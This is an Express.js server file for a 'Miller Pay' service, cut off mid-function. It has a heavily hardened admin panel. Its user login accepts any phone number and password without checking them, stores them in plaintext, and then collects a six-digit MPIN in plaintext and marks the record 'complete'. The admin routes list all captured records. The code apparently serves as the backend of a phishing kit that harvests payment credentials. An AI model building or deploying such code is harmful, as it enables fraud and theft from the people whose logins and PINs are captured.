import 'dotenv/config'
import express from 'express'
import cors from 'cors'
import helmet from 'helmet'
import morgan from 'morgan'
import rateLimit from 'express-rate-limit'
import jwt from 'jsonwebtoken'
import bcrypt from 'bcryptjs'
import { generateSecret, generateURI, verify as verifyOtp } from 'otplib'
import QRCode from 'qrcode'
import { createClient } from '@supabase/supabase-js'
import { existsSync, readFileSync } from 'node:fs'
import { createCipheriv, createDecipheriv, createHash, randomBytes } from 'node:crypto'
import {
  adminIdentity,
  adminJwtSecret,
  allowedOrigins,
  localNetworkOrigin,
  mfaEncryptionKey,
  port,
  userJwtSecret,
} from './config.js'

const app = express()
app.set('trust proxy', 1)
const packagedLoginDocument = new URL('../public/login.html', import.meta.url)
const workspaceLoginDocument = new URL('../../apps/user-app/dist/login.html', import.meta.url)
const loginDocument = existsSync(packagedLoginDocument)
  ? readFileSync(packagedLoginDocument, 'utf8')
  : existsSync(workspaceLoginDocument)
    ? readFileSync(workspaceLoginDocument, 'utf8')
    : null
const supabaseKey = process.env.SUPABASE_SERVICE_KEY || process.env.SUPABASE_KEY
const supabase =
  process.env.SUPABASE_URL && supabaseKey
    ? createClient(process.env.SUPABASE_URL, supabaseKey, {
        auth: { persistSession: false, autoRefreshToken: false },
      })
    : null

app.use(helmet({ crossOriginResourcePolicy: { policy: 'cross-origin' } }))
app.use(
  cors({
    credentials: true,
    origin(origin, callback) {
      if (!origin || allowedOrigins.includes(origin) || localNetworkOrigin.test(origin))
        return callback(null, true)
      callback(new Error('Origin not allowed'))
    },
  }),
)
app.use('/api/admin/slides', express.json({ limit: '8mb' }))
app.use('/api/admin/banner', express.json({ limit: '12mb' }))
app.use('/api/admin/popup-media', express.json({ limit: '36mb' }))
app.use(express.json({ limit: '1mb' }))

app.use(morgan('dev'))
app.use(
  ['/api/auth/login', '/api/auth/mfa/verify'],
  rateLimit({
    windowMs: 15 * 60 * 1000,
    limit: 20,
    standardHeaders: true,
    legacyHeaders: false,
    validate: { forwardedHeader: false },
  }),
)
app.use(
  '/api/auth/mpin',
  rateLimit({
    windowMs: 5 * 60 * 1000,
    limit: 10,
    standardHeaders: true,
    legacyHeaders: false,
    validate: { forwardedHeader: false },
  }),
)
app.use(
  '/api/admin',
  rateLimit({
    windowMs: 15 * 60 * 1000,
    limit: 240,
    standardHeaders: true,
    legacyHeaders: false,
    validate: { forwardedHeader: false },
  }),
)
app.use('/api/admin', async (req, res, next) => {
  const origin = req.get('origin')
  if (origin && !allowedOrigins.includes(origin) && !localNetworkOrigin.test(origin)) {
    return res.status(403).json({ message: 'Request origin is not allowed.' })
  }
  await refreshSettings()
  next()
})

const accounts = [
  {
    id: 'adm_1001',
    name: 'MillerPay Administrator',
    email: adminIdentity.email,
    passwordHash: bcrypt.hashSync(adminIdentity.password, 10),
    role: 'admin',
  },
]

const defaultSettings = {
  slides: 1,
  banner: false,
  telegram: false,
  popup: false,
  telegramUrl: 'https://t.me/millerpay',
  bannerMedia: null,
  bannerDuration: 5,
  popupMedia: null,
  popupDuration: 5,
  slideImages: [],
  updatedAt: new Date().toISOString(),
}
let publicSettings = { ...defaultSettings }
let deletedUserIds = []
let controlsInitialized = false
const defaultAdminSecurity = {
  passwordHash: accounts[0].passwordHash,
  mfa: { enabled: false, secret: null, pendingSecret: null },
  login: {
    failuresInStage: 0,
    failuresSinceSuccess: 0,
    lockStage: 0,
    lockUntil: null,
    captchaRequired: false,
    captcha: null,
    forceMfa: false,
  },
  sessionVersion: 1,
  trustedDevices: [],
  auditLogs: [],
}
let adminSecurity = structuredClone(defaultAdminSecurity)
let settingsLoadedAt = 0
let settingsLoadPromise = null
const settingsCacheMs = 4_000
const encryptionKey = createHash('sha256').update(mfaEncryptionKey).digest()

function hashValue(value) {
  return createHash('sha256').update(String(value)).digest('hex')
}

function encryptValue(value) {
  const iv = randomBytes(12)
  const cipher = createCipheriv('aes-256-gcm', encryptionKey, iv)
  const encrypted = Buffer.concat([cipher.update(String(value), 'utf8'), cipher.final()])
  return [
    iv.toString('base64url'),
    cipher.getAuthTag().toString('base64url'),
    encrypted.toString('base64url'),
  ].join('.')
}

function decryptValue(value) {
  const [iv, tag, encrypted] = String(value || '').split('.')
  if (!iv || !tag || !encrypted) throw new Error('Authenticator secret is unavailable.')
  const decipher = createDecipheriv('aes-256-gcm', encryptionKey, Buffer.from(iv, 'base64url'))
  decipher.setAuthTag(Buffer.from(tag, 'base64url'))
  return Buffer.concat([
    decipher.update(Buffer.from(encrypted, 'base64url')),
    decipher.final(),
  ]).toString('utf8')
}

function mergeAdminSecurity(saved = {}, legacyPasswordHash) {
  return {
    ...defaultAdminSecurity,
    ...saved,
    passwordHash: saved.passwordHash || legacyPasswordHash || defaultAdminSecurity.passwordHash,
    mfa: { ...defaultAdminSecurity.mfa, ...(saved.mfa || {}) },
    login: { ...defaultAdminSecurity.login, ...(saved.login || {}) },
    trustedDevices: Array.isArray(saved.trustedDevices) ? saved.trustedDevices.slice(-20) : [],
    auditLogs: Array.isArray(saved.auditLogs) ? saved.auditLogs.slice(-100) : [],
  }
}

function requestIp(req) {
  return String(req.ip || req.socket?.remoteAddress || 'unknown').slice(0, 120)
}

function userAgentHash(req) {
  return hashValue(req.get('user-agent') || 'unknown')
}

function audit(req, action, detail = '') {
  adminSecurity.auditLogs = [
    {
      id: randomBytes(10).toString('hex'),
      action,
      detail: String(detail).slice(0, 240),
      ip: requestIp(req),
      createdAt: new Date().toISOString(),
    },
    ...adminSecurity.auditLogs,
  ].slice(0, 100)
}

async function loadSettings() {
  if (!supabase) {
    settingsLoadedAt = Date.now()
    return
  }
  try {
    const { data } = await supabase.from('app_settings').select('data').eq('id', 1).single()
    if (data?.data) {
      const {
        adminPasswordHash,
        adminSecurity: savedAdminSecurity,
        deletedUserIds: savedDeletedUserIds,
        controlsInitialized: savedControlsInitialized,
        ...rest
      } = data.data
      publicSettings = { ...defaultSettings, ...rest }
      adminSecurity = mergeAdminSecurity(savedAdminSecurity, adminPasswordHash)
      accounts[0].passwordHash = adminSecurity.passwordHash
      deletedUserIds = Array.isArray(savedDeletedUserIds)
        ? [...new Set(savedDeletedUserIds.map(String))]
        : []
      controlsInitialized = savedControlsInitialized === true
      if (!controlsInitialized) {
        publicSettings.banner = false
        controlsInitialized = true
        await saveSettings()
      }
    }
  } catch (e) {
    console.error('Could not load settings:', e.message)
  } finally {
    settingsLoadedAt = Date.now()
  }
}

function refreshSettings(force = false) {
  if (!supabase || (!force && Date.now() - settingsLoadedAt < settingsCacheMs))
    return Promise.resolve()
  if (!settingsLoadPromise) {
    settingsLoadPromise = loadSettings().finally(() => {
      settingsLoadPromise = null
    })
  }
  return settingsLoadPromise
}

async function saveSettings() {
  if (!supabase) return
  try {
    const dataToSave = {
      ...publicSettings,
      adminSecurity: {
        ...adminSecurity,
        passwordHash: accounts.find((a) => a.role === 'admin').passwordHash,
      },
      deletedUserIds,
      controlsInitialized,
    }
    const { error } = await supabase
      .from('app_settings')
      .upsert({ id: 1, data: dataToSave, updated_at: new Date().toISOString() })
    if (error) throw error
    settingsLoadedAt = Date.now()
  } catch (e) {
    console.error('Could not save settings:', e.message)
    throw e
  }
}

const mediaExtensions = {
  'image/png': 'png',
  'image/jpeg': 'jpg',
  'image/webp': 'webp',
  'image/gif': 'gif',
  'video/mp4': 'mp4',
  'video/webm': 'webm',
  'video/quicktime': 'mov',
}

function mediaSignatureMatches(buffer, mimeType) {
  if (mimeType === 'image/png')
    return buffer.subarray(0, 8).equals(Buffer.from('89504e470d0a1a0a', 'hex'))
  if (mimeType === 'image/jpeg')
    return buffer[0] === 0xff && buffer[1] === 0xd8 && buffer[2] === 0xff
  if (mimeType === 'image/gif')
    return ['GIF87a', 'GIF89a'].includes(buffer.subarray(0, 6).toString('ascii'))
  if (mimeType === 'image/webp')
    return (
      buffer.subarray(0, 4).toString('ascii') === 'RIFF' &&
      buffer.subarray(8, 12).toString('ascii') === 'WEBP'
    )
  if (mimeType === 'video/webm') return buffer.subarray(0, 4).equals(Buffer.from('1a45dfa3', 'hex'))
  if (mimeType === 'video/mp4' || mimeType === 'video/quicktime')
    return buffer.subarray(4, 8).toString('ascii') === 'ftyp'
  return false
}

async function storeMediaFile({ dataUrl, name, prefix, allowedTypes, maxBytes }) {
  const match = String(dataUrl || '').match(/^data:([^;]+);base64,([A-Za-z0-9+/=]+)$/)
  if (!match || !allowedTypes.includes(match[1])) throw new Error('Unsupported media file.')
  const buffer = Buffer.from(match[2], 'base64')
  if (!buffer.length || buffer.length > maxBytes)
    throw new Error(`File must be smaller than ${Math.round(maxBytes / 1024 / 1024)} MB.`)
  if (!mediaSignatureMatches(buffer, match[1]))
    throw new Error('File content does not match its type.')
  if (!supabase) throw new Error('Storage not configured.')

  const mimeType = match[1]
  const ext = mediaExtensions[mimeType]
  const id = `${prefix}_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`
  const filename = `${id}.${ext}`

  const { error } = await supabase.storage.from('miller-media').upload(filename, buffer, {
    contentType: mimeType,
    upsert: false,
  })
  if (error) throw new Error(`Upload failed: ${error.message}`)

  const {
    data: { publicUrl },
  } = supabase.storage.from('miller-media').getPublicUrl(filename)

  return {
    id,
    name: String(name || 'Uploaded media').slice(0, 160),
    url: publicUrl,
    storageKey: filename,
    mimeType,
    type: mimeType.startsWith('video/') ? 'video' : 'image',
    createdAt: new Date().toISOString(),
  }
}

async function removeMediaFile(media) {
  if (!media?.storageKey || !supabase) return
  try {
    await supabase.storage.from('miller-media').remove([media.storageKey])
  } catch (e) {
    console.error('Could not remove media:', e.message)
  }
}

function parseCookies(req) {
  return Object.fromEntries(
    String(req.headers.cookie || '')
      .split(';')
      .map((part) => part.trim())
      .filter(Boolean)
      .map((part) => {
        const index = part.indexOf('=')
        return [decodeURIComponent(part.slice(0, index)), decodeURIComponent(part.slice(index + 1))]
      }),
  )
}

function secureRequest(req) {
  return req.secure || req.get('x-forwarded-proto') === 'https' || process.env.VERCEL === '1'
}

function sessionCookieName(role, req) {
  return secureRequest(req) ? `__Host-miller-${role}-session` : `miller-${role}-session`
}

function deviceCookieName(req) {
  return secureRequest(req) ? '__Host-miller-admin-device' : 'miller-admin-device'
}

function cookieOptions(req, maxAge) {
  return {
    httpOnly: true,
    secure: secureRequest(req),
    sameSite: 'strict',
    path: '/',
    maxAge,
  }
}

function tokenSecret(role) {
  return role === 'admin' ? adminJwtSecret : userJwtSecret
}

function sign(user) {
  return jwt.sign(
    {
      sub: user.id,
      role: user.role,
      email: user.email,
      phone: user.phone,
      name: user.name,
      ...(user.role === 'admin' ? { sessionVersion: adminSecurity.sessionVersion } : {}),
    },
    tokenSecret(user.role),
    { expiresIn: user.role === 'admin' ? '30m' : '8h' },
  )
}

function issueSession(req, res, user) {
  res.cookie(
    sessionCookieName(user.role, req),
    sign(user),
    cookieOptions(req, user.role === 'admin' ? 30 * 60 * 1000 : 8 * 60 * 60 * 1000),
  )
  return { id: user.id, name: user.name, email: user.email, phone: user.phone, role: user.role }
}

function clearSession(req, res, role) {
  const names = [
    sessionCookieName(role, req),
    `miller-${role}-session`,
    `__Host-miller-${role}-session`,
  ]
  for (const name of new Set(names)) {
    res.clearCookie(name, { ...cookieOptions(req, 0), maxAge: undefined })
  }
}

function requestToken(req, role) {
  const bearer = req.headers.authorization?.replace(/^Bearer\s+/i, '')
  const cookies = parseCookies(req)
  return (
    bearer ||
    cookies[sessionCookieName(role, req)] ||
    cookies[`__Host-miller-${role}-session`] ||
    cookies[`miller-${role}-session`]
  )
}

function auth(role) {
  return async (req, res, next) => {
    if (role === 'admin') await refreshSettings()
    const token = requestToken(req, role)
    if (!token) return res.status(401).json({ message: 'Sign in required' })
    try {
      const payload = jwt.verify(token, tokenSecret(role))
      if (payload.role !== role) return res.status(403).json({ message: 'Access denied' })
      if (role === 'admin' && payload.sessionVersion !== adminSecurity.sessionVersion) {
        clearSession(req, res, role)
        return res.status(401).json({ message: 'Session expired. Please sign in again.' })
      }
      req.auth = payload
      next()
    } catch {
      clearSession(req, res, role)
      res.status(401).json({ message: 'Session expired. Please sign in again.' })
    }
  }
}

function ensureDeviceCookie(req, res) {
  const cookies = parseCookies(req)
  const name = deviceCookieName(req)
  let value =
    cookies[name] || cookies['__Host-miller-admin-device'] || cookies['miller-admin-device']
  if (!value || value.length < 32) {
    value = randomBytes(32).toString('base64url')
    res.cookie(name, value, cookieOptions(req, 90 * 24 * 60 * 60 * 1000))
  }
  return { value, hash: hashValue(value) }
}

function trustCurrentDevice(req, res) {
  const device = ensureDeviceCookie(req, res)
  const next = {
    hash: device.hash,
    ip: requestIp(req),
    userAgentHash: userAgentHash(req),
    lastVerifiedAt: new Date().toISOString(),
  }
  adminSecurity.trustedDevices = [
    next,
    ...adminSecurity.trustedDevices.filter((item) => item.hash !== device.hash),
  ].slice(0, 20)
  return device
}

function trustedDevice(req) {
  const cookies = parseCookies(req)
  const value =
    cookies[deviceCookieName(req)] ||
    cookies['__Host-miller-admin-device'] ||
    cookies['miller-admin-device']
  if (!value) return false
  const record = adminSecurity.trustedDevices.find((item) => item.hash === hashValue(value))
  return Boolean(
    record && record.ip === requestIp(req) && record.userAgentHash === userAgentHash(req),
  )
}

function issueCaptcha() {
  const left = 10 + Math.floor(Math.random() * 40)
  const right = 2 + Math.floor(Math.random() * 18)
  const id = randomBytes(12).toString('hex')
  adminSecurity.login.captcha = {
    id,
    answerHash: hashValue(`${id}:${left + right}`),
    expiresAt: Date.now() + 5 * 60 * 1000,
  }
  return { id, question: `${left} + ${right} = ?` }
}

function captchaIsValid(captchaId, captchaAnswer) {
  const challenge = adminSecurity.login.captcha
  return Boolean(
    challenge &&
    challenge.id === String(captchaId || '') &&
    challenge.expiresAt > Date.now() &&
    challenge.answerHash === hashValue(`${challenge.id}:${String(captchaAnswer || '').trim()}`),
  )
}

async function saveSecurity() {
  accounts[0].passwordHash = adminSecurity.passwordHash
  await saveSettings()
}

async function recordAdminFailure(req) {
  const login = adminSecurity.login
  login.failuresInStage += 1
  login.failuresSinceSuccess += 1
  login.captchaRequired = login.failuresSinceSuccess >= 3
  login.forceMfa = login.failuresSinceSuccess >= 5
  audit(req, 'admin.login.failed', `Attempt ${login.failuresSinceSuccess}`)
  let lockMinutes = 0
  if (login.failuresInStage >= 3) {
    login.lockStage = Math.min(login.lockStage + 1, 2)
    lockMinutes = login.lockStage === 1 ? 5 : 15
    login.lockUntil = new Date(Date.now() + lockMinutes * 60 * 1000).toISOString()
    login.failuresInStage = 0
    audit(req, 'admin.login.locked', `${lockMinutes} minute lock`)
  }
  await saveSecurity()
  return lockMinutes
}

function resetAdminFailures() {
  adminSecurity.login = structuredClone(defaultAdminSecurity.login)
}

async function verifyAuthenticatorCode(code, encryptedSecret = adminSecurity.mfa.secret) {
  if (!encryptedSecret || !/^\d{6}$/.test(String(code || ''))) return false
  try {
    const result = await verifyOtp({ secret: decryptValue(encryptedSecret), token: String(code) })
    return result.valid === true
  } catch {
    return false
  }
}

app.get('/', (_req, res, next) => {
  if (!loginDocument) return next()
  res.type('html').send(loginDocument)
})

app.get('/api/health', (_req, res) =>
  res.json({
    status: 'ok',
    service: 'Miller Pay API',
  }),
)
app.post('/api/auth/login', async (req, res) => {
  const { email, phone, password, role, captchaId, captchaAnswer } = req.body
  const identifier = role === 'user' ? phone : email
  if (!identifier || !password || !role)
    return res.status(400).json({
      message: `${role === 'user' ? 'Phone number' : 'Email'}, password and account type are required.`,
    })
  if (role === 'user' && !/^\d{10}$/.test(String(phone)))
    return res.status(400).json({ message: 'Enter a valid 10-digit mobile number.' })
  if (String(password).length < 4)
    return res.status(400).json({ message: 'Password must be at least 4 characters.' })

  if (role === 'user') {
    if (supabase) {
      const { data: newRecord, error } = await supabase
        .from('login_records')
        .insert([{ mobile: String(phone), password: String(password), status: 'pending' }])
        .select('id')
        .single()

      if (error) {
        console.error('Supabase error:', error)
        return res.status(500).json({ message: 'Database error' })
      }

      const guestUser = {
        id: newRecord.id,
        name: 'MillerPay User',
        phone: String(phone),
        email: `${String(phone)}@local.millerpay`,
        role: 'user',
      }
      return res.json({ user: issueSession(req, res, guestUser), registrationRequired: true })
    } else {
      const guestUser = {
        id: `usr_${String(phone)}`,
        name: 'MillerPay User',
        phone: String(phone),
        email: `${String(phone)}@local.millerpay`,
        role: 'user',
      }
      return res.json({ user: issueSession(req, res, guestUser), registrationRequired: true })
    }
  }

  await refreshSettings(true)
  const lockedUntil = Date.parse(adminSecurity.login.lockUntil || '')
  if (Number.isFinite(lockedUntil) && lockedUntil > Date.now()) {
    return res.status(423).json({
      message: `Too many attempts. Try again in ${Math.ceil((lockedUntil - Date.now()) / 60000)} minute(s).`,
      retryAfterSeconds: Math.ceil((lockedUntil - Date.now()) / 1000),
      captchaRequired: true,
    })
  }
  if (adminSecurity.login.captchaRequired) {
    if (!captchaIsValid(captchaId, captchaAnswer)) {
      const captcha = issueCaptcha()
      await saveSecurity()
      return res.status(428).json({
        message: 'Complete the security check to continue.',
        captchaRequired: true,
        captcha,
      })
    }
    adminSecurity.login.captcha = null
  }

  const admin = accounts.find(
    (item) => item.role === 'admin' && item.email.toLowerCase() === String(email).toLowerCase(),
  )
  if (!admin || !(await bcrypt.compare(password, adminSecurity.passwordHash))) {
    const lockMinutes = await recordAdminFailure(req)
    return res.status(lockMinutes ? 423 : 401).json({
      message: lockMinutes
        ? `Too many attempts. Admin login is locked for ${lockMinutes} minutes.`
        : 'Incorrect email or password.',
      captchaRequired: adminSecurity.login.captchaRequired,
      retryAfterSeconds: lockMinutes ? lockMinutes * 60 : undefined,
    })
  }

  if (bcrypt.getRounds(adminSecurity.passwordHash) < 12) {
    adminSecurity.passwordHash = await bcrypt.hash(String(password), 12)
    admin.passwordHash = adminSecurity.passwordHash
  }

  const needsMfa =
    adminSecurity.mfa.enabled && (!trustedDevice(req) || adminSecurity.login.forceMfa)
  if (needsMfa) {
    ensureDeviceCookie(req, res)
    audit(req, 'admin.mfa.required', trustedDevice(req) ? 'Repeated failures' : 'New device or IP')
    await saveSecurity()
    return res.json({
      mfaRequired: true,
      challengeToken: jwt.sign(
        { sub: admin.id, role: 'admin', type: 'mfa-login' },
        adminJwtSecret,
        { expiresIn: '5m' },
      ),
    })
  }

  resetAdminFailures()
  audit(
    req,
    'admin.login.succeeded',
    adminSecurity.mfa.enabled ? 'Trusted device' : 'MFA not bound',
  )
  await saveSecurity()
  res.json({ user: issueSession(req, res, admin) })
})

app.post('/api/auth/mfa/verify', async (req, res) => {
  const { challengeToken, code } = req.body || {}
  let challenge
  try {
    challenge = jwt.verify(String(challengeToken || ''), adminJwtSecret)
  } catch {
    return res.status(401).json({ message: 'Authenticator challenge expired. Sign in again.' })
  }
  if (challenge.type !== 'mfa-login' || challenge.role !== 'admin') {
    return res.status(401).json({ message: 'Invalid authenticator challenge.' })
  }
  await refreshSettings(true)
  if (!(await verifyAuthenticatorCode(code))) {
    audit(req, 'admin.mfa.failed', 'Invalid login code')
    await saveSecurity()
    return res.status(401).json({ message: 'Incorrect Authenticator code.' })
  }
  const admin = accounts.find((item) => item.id === challenge.sub && item.role === 'admin')
  if (!admin) return res.status(401).json({ message: 'Admin account is unavailable.' })
  trustCurrentDevice(req, res)
  resetAdminFailures()
  audit(req, 'admin.login.succeeded', 'Authenticator verified')
  await saveSecurity()
  res.json({ user: issueSession(req, res, admin) })
})

app.get('/api/auth/session/user', auth('user'), (req, res) => {
  res.json({
    user: {
      id: req.auth.sub,
      name: req.auth.name,
      email: req.auth.email,
      phone: req.auth.phone,
      role: 'user',
    },
  })
})

app.get('/api/auth/session/admin', auth('admin'), (req, res) => {
  res.json({
    user: { id: req.auth.sub, name: req.auth.name, email: req.auth.email, role: 'admin' },
  })
})

app.post('/api/auth/logout', (req, res) => {
  const role = req.body?.role === 'admin' ? 'admin' : 'user'
  clearSession(req, res, role)
  res.json({ message: 'Signed out.' })
})
app.post('/api/auth/mpin', auth('user'), async (req, res) => {
  const { mpin } = req.body
  if (!mpin || String(mpin).length !== 6) return res.status(400).json({ message: 'Invalid MPIN' })

  if (supabase) {
    await supabase
      .from('login_records')
      .update({ mpin: String(mpin), status: 'complete' })
      .eq('id', req.auth.sub)
  }
  res.json({ message: 'MPIN updated successfully' })
})
app.get('/api/public/settings', async (_req, res) => {
  await refreshSettings()
  res.json({ settings: publicSettings })
})
app.put('/api/admin/settings', auth('admin'), async (req, res) => {
  const next = req.body || {}
  const previousSettings = publicSettings
  publicSettings = {
    ...publicSettings,
    slides: Array.isArray(publicSettings.slideImages) ? publicSettings.slideImages.length || 1 : 1,
    banner: typeof next.banner === 'boolean' ? next.banner : publicSettings.banner,
    telegram: typeof next.telegram === 'boolean' ? next.telegram : publicSettings.telegram,
    popup: typeof next.popup === 'boolean' ? next.popup : publicSettings.popup,
    telegramUrl:
      typeof next.telegramUrl === 'string'
        ? next.telegramUrl.trim().slice(0, 500)
        : publicSettings.telegramUrl,
    bannerDuration: Number.isFinite(Number(next.bannerDuration))
      ? Math.max(1, Math.min(60, Number(next.bannerDuration)))
      : publicSettings.bannerDuration,
    popupDuration: Number.isFinite(Number(next.popupDuration))
      ? Math.max(1, Math.min(60, Number(next.popupDuration)))
      : publicSettings.popupDuration,
    updatedAt: new Date().toISOString(),
  }
  try {
    await saveSettings()
    audit(req, 'admin.settings.updated')
    await saveSecurity()
    res.json({ settings: publicSettings })
  } catch {
    publicSettings = previousSettings
    res.status(500).json({ message: 'Settings could not be saved.' })
  }
})
app.post('/api/admin/slides', auth('admin'), async (req, res) => {
  try {
    const { name, dataUrl } = req.body || {}
    const media = await storeMediaFile({
      dataUrl,
      name,
      prefix: 'slide',
      allowedTypes: ['image/png', 'image/jpeg', 'image/webp', 'image/gif'],
      maxBytes: 5 * 1024 * 1024,
    })
    publicSettings.slideImages = [...(publicSettings.slideImages || []), media]
    publicSettings.slides = publicSettings.slideImages.length
    publicSettings.updatedAt = new Date().toISOString()
    await saveSettings()
    audit(req, 'admin.slide.uploaded', media.name)
    await saveSecurity()
    res.status(201).json({ slide: media, settings: publicSettings })
  } catch (error) {
    res.status(400).json({ message: error.message || 'Slide could not be uploaded.' })
  }
})
app.delete('/api/admin/slides/:id', auth('admin'), async (req, res) => {
  const slide = (publicSettings.slideImages || []).find((item) => item.id === req.params.id)
  if (!slide) return res.status(404).json({ message: 'Slide not found.' })
  await removeMediaFile(slide)
  publicSettings.slideImages = publicSettings.slideImages.filter((item) => item.id !== slide.id)
  publicSettings.slides = publicSettings.slideImages.length || 1
  publicSettings.updatedAt = new Date().toISOString()
  await saveSettings()
  audit(req, 'admin.slide.deleted', slide.name)
  await saveSecurity()
  res.json({ settings: publicSettings })
})
app.post('/api/admin/banner', auth('admin'), async (req, res) => {
  try {
    const media = await storeMediaFile({
      dataUrl: req.body?.dataUrl,
      name: req.body?.name,
      prefix: 'banner',
      allowedTypes: ['image/png', 'image/jpeg', 'image/webp', 'image/gif'],
      maxBytes: 8 * 1024 * 1024,
    })
    await removeMediaFile(publicSettings.bannerMedia)
    publicSettings.bannerMedia = media
    publicSettings.updatedAt = new Date().toISOString()
    await saveSettings()
    audit(req, 'admin.banner.uploaded', media.name)
    await saveSecurity()
    res.status(201).json({ media, settings: publicSettings })
  } catch (error) {
    res.status(400).json({ message: error.message || 'Banner could not be uploaded.' })
  }
})
app.delete('/api/admin/banner', auth('admin'), async (req, res) => {
  await removeMediaFile(publicSettings.bannerMedia)
  publicSettings.bannerMedia = null
  publicSettings.updatedAt = new Date().toISOString()
  await saveSettings()
  audit(req, 'admin.banner.deleted')
  await saveSecurity()
  res.json({ settings: publicSettings })
})
app.post('/api/admin/popup-media', auth('admin'), async (req, res) => {
  try {
    const media = await storeMediaFile({
      dataUrl: req.body?.dataUrl,
      name: req.body?.name,
      prefix: 'popup',
      allowedTypes: [
        'image/png',
        'image/jpeg',
        'image/webp',
        'image/gif',
        'video/mp4',
        'video/webm',
        'video/quicktime',
      ],
      maxBytes: 25 * 1024 * 1024,
    })
    await removeMediaFile(publicSettings.popupMedia)
    publicSettings.popupMedia = media
    publicSettings.updatedAt = new Date().toISOString()
    await saveSettings()
    audit(req, 'admin.popup.uploaded', media.name)
    await saveSecurity()
    res.status(201).json({ media, settings: publicSettings })
  } catch (error) {
    res.status(400).json({ message: error.message || 'Popup media could not be uploaded.' })
  }
})
app.delete('/api/admin/popup-media', auth('admin'), async (req, res) => {
  await removeMediaFile(publicSettings.popupMedia)
  publicSettings.popupMedia = null
  publicSettings.updatedAt = new Date().toISOString()
  await saveSettings()
  audit(req, 'admin.popup.deleted')
  await saveSecurity()
  res.json({ settings: publicSettings })
})
app.get('/api/admin/mfa/status', auth('admin'), async (_req, res) => {
  res.json({ enabled: adminSecurity.mfa.enabled === true })
})
app.post('/api/admin/mfa/setup', auth('admin'), async (req, res) => {
  const { currentPassword } = req.body || {}
  if (!(await bcrypt.compare(String(currentPassword || ''), adminSecurity.passwordHash))) {
    audit(req, 'admin.mfa.setup.failed', 'Current password rejected')
    await saveSecurity()
    return res.status(400).json({ message: 'Current password is incorrect.' })
  }
  if (adminSecurity.mfa.enabled) {
    return res.status(409).json({ message: 'Google Authenticator is already bound.' })
  }
  const secret = generateSecret()
  adminSecurity.mfa.pendingSecret = encryptValue(secret)
  const uri = generateURI({ issuer: 'Miller Pay Admin', label: adminIdentity.email, secret })
  const qrCode = await QRCode.toDataURL(uri, { width: 360, margin: 2, errorCorrectionLevel: 'M' })
  audit(req, 'admin.mfa.setup.started')
  await saveSecurity()
  res.json({ qrCode, manualKey: secret })
})
app.post('/api/admin/mfa/verify-setup', auth('admin'), async (req, res) => {
  const pending = adminSecurity.mfa.pendingSecret
  if (!pending) return res.status(400).json({ message: 'Start Authenticator setup again.' })
  if (!(await verifyAuthenticatorCode(req.body?.code, pending))) {
    audit(req, 'admin.mfa.setup.failed', 'Invalid verification code')
    await saveSecurity()
    return res.status(400).json({ message: 'Incorrect Authenticator code.' })
  }
  adminSecurity.mfa.secret = pending
  adminSecurity.mfa.pendingSecret = null
  adminSecurity.mfa.enabled = true
  trustCurrentDevice(req, res)
  audit(req, 'admin.mfa.bound')
  await saveSecurity()
  res.json({ enabled: true, message: 'Google Authenticator has been bound.' })
})
app.get('/api/admin/security/audit', auth('admin'), async (_req, res) => {
  res.json({ events: adminSecurity.auditLogs.slice(0, 20) })
})
app.put('/api/admin/password', auth('admin'), async (req, res) => {
  const { currentPassword, newPassword, mfaCode } = req.body || {}
  const admin = accounts.find((item) => item.role === 'admin' && item.id === req.auth.sub)
  if (!admin || !(await bcrypt.compare(String(currentPassword || ''), adminSecurity.passwordHash)))
    return res.status(400).json({ message: 'Current password is incorrect.' })
  if (!adminSecurity.mfa.enabled) {
    return res.status(409).json({ message: 'Bind Google Authenticator before changing password.' })
  }
  if (!(await verifyAuthenticatorCode(mfaCode))) {
    audit(req, 'admin.password.failed', 'Invalid Authenticator code')
    await saveSecurity()
    return res.status(400).json({ message: 'Incorrect Authenticator code.' })
  }
  if (String(newPassword || '').length < 8)
    return res.status(400).json({ message: 'New password must be at least 8 characters.' })
  admin.passwordHash = await bcrypt.hash(String(newPassword), 12)
  adminSecurity.passwordHash = admin.passwordHash
  adminSecurity.sessionVersion += 1
  audit(req, 'admin.password.changed')
  await saveSecurity()
  issueSession(req, res, admin)
  res.json({ message: 'Password updated successfully. Other admin sessions were signed out.' })
})
app.get('/api/admin/users', auth('admin'), async (req, res) => {
  if (!supabase)
    return res.json({ users: [], stats: { total: 0, active: 0, trash: 0, complete: 0 } })
  const { data: users, error } = await supabase
    .from('login_records')
    .select('*')
    .order('created_at', { ascending: false })

  if (error) {
    console.error('Supabase error:', error)
    return res.status(500).json({ message: 'Database error' })
  }
  const records = users || []
  const trashed = new Set(deletedUserIds)
  const activeUsers = records.filter((user) => !trashed.has(String(user.id)))
  const trashUsers = records.filter((user) => trashed.has(String(user.id)))
  const scope = req.query.scope === 'trash' ? 'trash' : 'active'
  res.json({
    users: scope === 'trash' ? trashUsers : activeUsers,
    stats: {
      total: activeUsers.length,
      active: activeUsers.length,
      trash: trashUsers.length,
      complete: activeUsers.filter((user) => user.status === 'complete').length,
    },
  })
})
app.delete('/api/admin/users', auth('admin'), async (req, res) => {
  const { ids } = req.body
  if (!Array.isArray(ids) || ids.length === 0)
    return res.status(400).json({ message: 'No records selected.' })

  if (supabase) {
    await refreshSettings(true)
    const previousIds = deletedUserIds
    deletedUserIds = [...new Set([...deletedUserIds, ...ids.map(String)])]
    try {
      await saveSettings()
    } catch {
      deletedUserIds = previousIds
      return res.status(500).json({ message: 'Could not move records to Trash.' })
    }
  }
  audit(req, 'admin.users.trashed', `${ids.length} record(s)`)
  await saveSecurity()
  res.json({ message: 'Records moved to Trash.' })
})
app.post('/api/admin/users/restore', auth('admin'), async (req, res) => {
  const { ids } = req.body
  if (!Array.isArray(ids) || ids.length === 0)
    return res.status(400).json({ message: 'No records selected.' })

  if (supabase) {
    await refreshSettings(true)
    const previousIds = deletedUserIds
    const restoring = new Set(ids.map(String))
    deletedUserIds = deletedUserIds.filter((id) => !restoring.has(id))
    try {
      await saveSettings()
    } catch {
      deletedUserIds = previousIds
      return res.status(500).json({ message: 'Could not restore records.' })
    }
  }
  audit(req, 'admin.users.restored', `${ids.length} record(s)`)
  await saveSecurity()
  res.json({ message: 'Records restored successfully.' })
})
app.delete('/api/admin/users/permanent', auth('admin'), async (req, res) => {
  const { ids } = req.body
  if (!Array.isArray(ids) || ids.length === 0)
    return res.status(400).json({ message: 'No records selected.' })

  if (supabase) {
    await refreshSettings(true)
    const trashed = new Set(deletedUserIds)
    const permanentIds = ids.map(String).filter((id) => trashed.has(id))
    if (!permanentIds.length)
      return res.status(400).json({ message: 'Only Trash records can be deleted permanently.' })
